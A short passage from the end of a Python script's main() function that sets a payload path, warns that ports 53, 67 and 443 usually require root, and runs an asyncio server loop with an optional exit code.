        args.payload_path = args.payload
    if sys.platform != "win32" and hasattr(os, "geteuid") and os.geteuid() != 0:
        print("warning: privileged ports 53/67/443 usually require root",
              file=sys.stderr)
    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        pass
    if args.page_exit:
        sys.exit(args.page_exit)


if __name__ == "__main__":
    main()